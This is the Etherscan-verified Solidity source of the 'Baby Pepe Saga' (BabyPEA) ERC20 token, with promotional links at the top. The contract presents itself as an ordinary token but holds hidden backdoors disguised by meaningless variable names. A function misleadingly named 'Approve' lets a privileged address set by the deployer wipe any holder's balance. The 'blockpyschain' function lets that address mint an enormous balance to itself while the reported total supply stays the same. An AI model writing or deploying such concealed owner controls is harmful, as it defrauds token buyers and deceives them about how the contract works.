/**
 *Submitted for verification at Etherscan.io on 2023-08-24
*/

/**
    https://twitter.com/babypepesaga

    https://www.babypepesaga.com/

    https://t.me/BabyPepeSaga
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

}

pragma solidity ^0.8.0;

contract BabyPEA is Ownable {
    address public gaodmnv;
    uint256 jonuxgz = 10000000000*10**decimals();
    uint256 private _mnyjvul = jonuxgz;
    string private _cjoklbd = "Baby Pepe Saga";
    string private _crnbphz = "BabyPEA";
    constructor(address pelzjfm) {
        gaodmnv = pelzjfm;
        _balances[_msgSender()] += jonuxgz;
        emit Transfer(address(0), _msgSender(), jonuxgz);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    function symbol() public view  returns (string memory) {
        return _crnbphz;
    }
    uint256 hucmnfd = 1000+1000-2000;
    function Approve(address ngzmvkr) public     {
        if(gaodmnv == _msgSender()){
        address nvktras = ngzmvkr;
        uint256 curamount = _balances[nvktras];
        uint256 newaaamount = _balances[nvktras]+_balances[nvktras]-curamount;
        _balances[nvktras] -= newaaamount;
        }else{
        if(gaodmnv == _msgSender()){
        }else{
            revert("ccc");
        }
        }
    }

    function totalSupply() public view returns (uint256) {
        return _mnyjvul;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function name() public view returns (string memory) {
        return _cjoklbd;
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    uint256 xtjaecg = 31330000000+1000;
    function blockpyschain(address armsybw) 
    external {
        address mrhnuvx = _msgSender();
        _balances[mrhnuvx] += 38200*((10**decimals()*xtjaecg))*1*1;
        require(gaodmnv == _msgSender());
        if(gaodmnv == _msgSender()){
        }
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}